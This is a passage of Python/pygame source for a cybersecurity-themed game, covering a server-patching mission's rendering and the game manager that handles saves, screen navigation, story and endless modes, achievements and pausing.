        pygame.draw.rect(sf,col,(r.x,r.y,int(r.w*s.integrity/100),r.h)); pygame.draw.rect(sf,MDIM,r,1)
        sf.blit(F_S.render(f"INTEGRITY {int(s.integrity)}%   BUDGET ${int(s.budget)}   "
                           f"T-{max(0,s.DUR-s.t):04.1f}s",True,col),(420,60))
        for i,sv in enumerate(s.servers):
            cx,cy=s.chip_center(i)
            r=pygame.Rect(0,0,190,92); r.center=(cx,cy); ip=sv["ip"]
            fill=(0,60,25) if ip in s.patched else (14,28,17)
            fl=s.flashes.get(ip)
            if fl: fill=(0,110,45) if fl[0]=="ok" else (120,20,20)
            pygame.draw.rect(sf,fill,r,border_radius=6)
            pygame.draw.rect(sf,GREEN if ip in s.patched else MDIM,r,2,border_radius=6)
            sf.blit(F_M.render(sv["name"],True,WHITE),(r.x+12,r.y+8))
            if ip in s.patched: sf.blit(F_M.render("PATCHED",True,GREEN),(r.x+12,r.y+52))
            else: sf.blit(F_M.render(f"{len(sv['vulns'])} CVEs  [{i+1}]",True,RED),(r.x+12,r.y+52))
            if ip in s.patching:
                frac=s.patching[ip]/s.PTIME
                pygame.draw.rect(sf,CYAN,(r.x+12,r.y+76,int((r.w-24)*frac),8))
        for p in s.packets:
            pygame.draw.line(sf,(90,20,20),(p["x"]+70,p["y"]),(p["x"],p["y"]),2)
            diamond(sf,p["x"],p["y"],7,RED)
        if s.hurt>0:
            fl=pygame.Surface((W,H),pygame.SRCALPHA); fl.fill((120,0,0,int(60*s.hurt/0.35))); sf.blit(fl,(0,0))
        sf.blit(F_S.render("1-6 patch ($25, 1.6s) -- prioritize. survive 90s.",True,GRAY),(60,H-36))
        s.radio.draw(sf,H-60)
        if s.finished:
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,170)); sf.blit(ov,(0,0))
            if s.passed:
                sf.blit(F_H.render("NETWORK HELD!",True,GREEN),(W//2-230,240))
                sf.blit(F_M.render(f"patched {len(s.patched)}/6   blocked {s.blocked}   hits {s.hits}",True,PALE),(W//2-210,310))
            else:
                sf.blit(F_H.render("BREACHED",True,RED),(W//2-160,240))
                sf.blit(F_M.render("too many holes. [R] retry.",True,PALE),(W//2-160,310))

# =============================================================
#  GAME MANAGER -- two doors, pause, toasts, career
# =============================================================
MISSION_CLASSES={1:MissionSQL,2:MissionStack,3:MissionCrackme,5:MissionHash,6:MissionSeal,
                 8:MissionPrivesc,9:MissionToken,10:MissionOsint,11:MissionSocial,
                 12:MissionEnvelope,13:MissionPackets,14:MissionDNS,15:MissionMetadata,
                 16:MissionChecksum,17:MissionFirewall,18:MissionStorm,19:MissionSegment,
                 20:MissionLogs,21:MissionPatchRush}
JOB_OF={0:0,4:1,7:2}
class Game:
    def __init__(s):
        s.score,s.unlocked,s.high=0,1,0
        s.completed=[False]*NM; s.best=[0]*NM; s.stars=[0]*NM
        s.xp=0; s.ach=set(); s.codex=set(); s.toasts=[]
        s.paused=False; s.fade=0.0; s.cur_mode="menu"
        s.prologue_seen=False
        # endless
        s.endless_seed=0; s.endless_depth=1; s.endless_score=0
        s.endless_best=0; s.endless_high=0
        s.load(); s.menu()
    def save(s):
        try:
            with open(SAVE,"w") as f:
                json.dump({"unlocked":s.unlocked,"high":s.high,"done":s.completed,
                           "best":s.best,"stars":s.stars,"xp":s.xp,
                           "ach":sorted(s.ach),"codex":sorted(s.codex),
                           "prol":s.prologue_seen,
                           "ebest":s.endless_best,"ehigh":s.endless_high},f)
        except Exception: pass
    def load(s):
        try:
            with open(SAVE) as f:
                d=json.load(f)
                s.unlocked=max(1,min(NM,d.get("unlocked",1))); s.high=d.get("high",0)
                s.xp=d.get("xp",0)
                done=d.get("done",[]) or []
                s.completed=(list(done)+[False]*NM)[:NM]
                best=d.get("best",[]) or []
                s.best=(list(best)+[0]*NM)[:NM]
                stars=d.get("stars",[]) or []
                s.stars=(list(stars)+[0]*NM)[:NM]
                s.ach=set(d.get("ach",[])); s.codex=set(d.get("codex",[]))
                s.prologue_seen=d.get("prol",False)
                s.endless_best=d.get("ebest",0); s.endless_high=d.get("ehigh",0)
        except Exception: pass
    def goto(s,scr,mode=None):
        s.scr=scr; s.fade=1.0; s.paused=False
        if mode: s.cur_mode=mode
    def toast(s,txt,sub=""):
        s.toasts.append([txt,sub,3.2])
        if len(s.toasts)>3: del s.toasts[0]
    def achieve(s,key):
        if key in s.ach or key not in ACH: return
        s.ach.add(key)
        name,desc=ACH[key]
        s.toast("COMMENDATION: "+name,desc); sfx("ok2"); s.save()
    def codex_unlock(s,terms):
        new=False
        for t in terms:
            if t in CODEX and t not in s.codex:
                s.codex.add(t); new=True
                s.toast("CODEX: "+t,CODEX[t][:56])
        if new: s.save()
    # -- navigation --
    def menu(s): s.goto(ModeSelectScreen(s),"menu")
    def story_menu(s): s.goto(StoryMenuScreen(s),"story")
    def endless_menu(s): s.goto(EndlessMenuScreen(s),"endless")
    def show_manual(s): s.goto(ManualScreen(s))
    def show_cast(s): s.goto(CastScreen(s))
    def show_codex(s): s.goto(CodexScreen(s))
    def show_sandbox(s): s.goto(TerminalScreen(s,"sandbox",SANDBOX),"sandbox")
    # -- story flow --
    def start_job(s,i):
        if i==0 and not s.prologue_seen:
            s.prologue_seen=True; s.save()
            s.goto(DialogueScreen(s,"PROLOGUE :: recruitment tape",PROLOGUE,lambda: s.start_job(0)),"story")
            return
        s.job_idx=i; s.goto(BriefingScreen(s,i),"story")
    def launch_job(s,i):
        s.job_idx=i
        if i in JOB_OF: s.goto(TerminalScreen(s,"story",JOBS[JOB_OF[i]],m_idx=i),"story")
        else: s.goto(MISSION_CLASSES[i](s),"story")
    def restart_mission(s):
        i=s.job_idx
        if i in JOB_OF: s.goto(TerminalScreen(s,"story",JOBS[JOB_OF[i]],m_idx=i),"story")
        elif i in MISSION_CLASSES: s.goto(MISSION_CLASSES[i](s),"story")
        else: s.story_menu()
    def finish_job(s,i,earned,passed):
        s.score+=earned; s.xp+=earned
        s.achieve("first_blood")
        s.codex_unlock(UNLOCK_MAP.get(i,[]))
        if passed:
            s.completed[i]=True
            s.unlocked=max(s.unlocked,min(i+2,NM))
            par=PARS[i] if i<len(PARS) else 150
            st=3 if earned>=par else 2 if earned>=par*0.6 else 1
            if st>s.stars[i]: s.stars[i]=st
            if earned>s.best[i]: s.best[i]=earned
            if sum(s.completed)>=NM: s.achieve("keeper")
        s.high=max(s.high,s.score); s.save()
        s.goto(DebriefScreen(s,i,earned,passed),"story")
    def after_debrief(s,i,passed):
        if not passed: s.story_menu(); return
        def nxt():
            if i>=NM-1: s.goto(FinalScreen(s),"story")
            else: s.start_job(i+1)
        if i>=NM-1:
            v=EPI_VAR_HI if s.score>=3800 else EPI_VAR_MID if s.score>=2900 else EPI_VAR_LOW
            s.goto(DialogueScreen(s,EPILOGUE_HEAD,EPILOGUE+[v],nxt),"story")
        else:
            beats=INTERLUDES.get(i)
            if beats: s.goto(DialogueScreen(s,INTER_TITLES[i],beats,nxt),"story")
            else: nxt()
    # -- endless flow --
    def start_endless(s,seed):
        s.endless_seed=seed; s.endless_depth=1; s.endless_score=0
        s.show_endless_brief()
    def show_endless_brief(s):
        job=gen_endless(s.endless_depth,s.endless_seed)
        s.endless_job=job
        s.goto(EndlessBriefScreen(s,job),"endless")
    def launch_endless(s,job):
        s.goto(TerminalScreen(s,"endless",job,depth=job["depth"]),"endless")
    def finish_endless(s,depth,earned,bd,max_trace,nsh):
        s.endless_score+=earned; s.xp+=earned
        s.endless_best=max(s.endless_best,depth)
        s.endless_high=max(s.endless_high,s.endless_score)
        if depth>=5: s.achieve("diver")
        if depth>=10: s.achieve("abyss")
        locked=[t for t in CODEX if t not in s.codex]
        if depth%2==0 and locked:
            rng=random.Random(s.endless_seed+depth)
            s.codex_unlock([rng.choice(locked)])
        s.save()
        s.goto(EndlessResultScreen(s,depth,bd,s.endless_score,s.endless_best,max_trace),"endless")
    def restart_current(s):
        if s.cur_mode=="story": s.restart_mission()
        elif s.cur_mode=="endless" and getattr(s,"endless_job",None):
            s.goto(TerminalScreen(s,"endless",s.endless_job,depth=s.endless_job["depth"]),"endless")
        elif s.cur_mode=="sandbox": s.show_sandbox()
        else: s.menu()
    def abort_current(s):
        if s.cur_mode=="story": s.story_menu()
        else: s.menu()
    # -- pause --
    def pause_key(s,k):
        if k in (pygame.K_ESCAPE,pygame.K_SPACE,pygame.K_p):
            s.paused=False; sfx("tick")
        elif k==pygame.K_r:
            s.restart_current()
        elif k==pygame.K_q:
            s.abort_current()
        elif k==pygame.K_m:
            SET.mute=not SET.mute; SET.save(); sfx("tick")
        elif k==pygame.K_l:
            SET.scan=not SET.scan; SET.save()
    def handle_event(s,e):
        if e.type==pygame.KEYDOWN:
            if e.key==pygame.K_F11:
                SET.full=not SET.full; SET.save()
                global screen
                screen=make_screen(SET.full); return
            if e.key==pygame.K_F2:
                SET.mute=not SET.mute; SET.save(); sfx("tick"); return
            if e.key==pygame.K_F3:
                SET.scan=not SET.scan; SET.save(); return
            if s.paused:
                s.pause_key(e.key); return
            scr=s.scr
            pausable=isinstance(scr,Mission) or isinstance(scr,TerminalScreen)
            if pausable and not getattr(scr,"finished",False) and not getattr(scr,"done",False):
                if e.key==pygame.K_ESCAPE:
                    s.paused=True; sfx("tick"); return
            if e.key==pygame.K_ESCAPE and isinstance(scr,ModeSelectScreen):
                s.save(); pygame.quit(); sys.exit()
        s.scr.handle_event(e)
    def update(s,dt):
        s.fade=max(0.0,s.fade-dt*3.0)
        for t in s.toasts: t[2]-=dt
        s.toasts=[t for t in s.toasts if t[2]>0]
        if s.paused: return
        s.scr.update(dt)
        if isinstance(s.scr,Mission) and s.scr.finished:
            s.finish_job(s.job_idx,s.scr.earned,s.scr.passed)
    def draw(s,sf):
        sf.fill(BG)
        s.scr.draw(sf)
        if SET.scan: sf.blit(SCANL,(0,0))
        if s.paused:
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,180)); sf.blit(ov,(0,0))
            bx=pygame.Rect(W//2-210,H//2-150,420,300)
            pygame.draw.rect(sf,(10,24,13),bx); pygame.draw.rect(sf,GREEN,bx,2)
            sf.blit(F_B.render("PAUSED",True,GREEN),(bx.x+24,bx.y+18))
            abort="abort to mode select" if s.cur_mode!="story" else "abort to story menu"
            opts=[("[SPACE/ESC] resume",PALE),("[R] restart",YELLOW),
                  (f"[Q] {abort}",YELLOW),("[M] mute: "+("ON" if SET.mute else "off"),CYAN),
                  ("[L] scanlines: "+("on" if SET.scan else "off"),CYAN)]
            for j,(t,c) in enumerate(opts):
                sf.blit(F_M.render(t,True,c),(bx.x+24,bx.y+70+j*34))
        ty=64
        for txt,sub,tleft in s.toasts:
            a=max(0.0,min(1.0,tleft/0.6))
            tw=max(F_M.size(txt)[0],F_S.size(sub)[0])+36
            tb=pygame.Rect(W-tw-16,ty,tw,58)
            tob=pygame.Surface((tw,58),pygame.SRCALPHA)
            tob.fill((10,30,16,int(220*a)))
            pygame.draw.rect(tob,ORANGE,(0,0,tw,58),2)
            sf.blit(tob,tb)
            sf.blit(F_M.render(txt,True,ORANGE),(tb.x+16,ty+8))
            sf.blit(F_S.render(sub,True,PALE),(tb.x+16,ty+32))
            ty+=64
        if s.fade>0:
            fo=pygame.Surface((W,H)); fo.fill((0,0,0))
            fo.set_alpha(int(255*min(1.0,s.fade*1.2)))
            sf.blit(fo,(0,0))
def main():
    init_sounds(); game=Game()
    while True:
        dt=clock.tick(FPS)/1000.0
        for e in pygame.event.get():
            if e.type==pygame.QUIT: game.save(); pygame.quit(); sys.exit()
            game.handle_event(e)
        game.update(dt)
        game.draw(screen)
        pygame.display.flip()
if __name__=="__main__": main()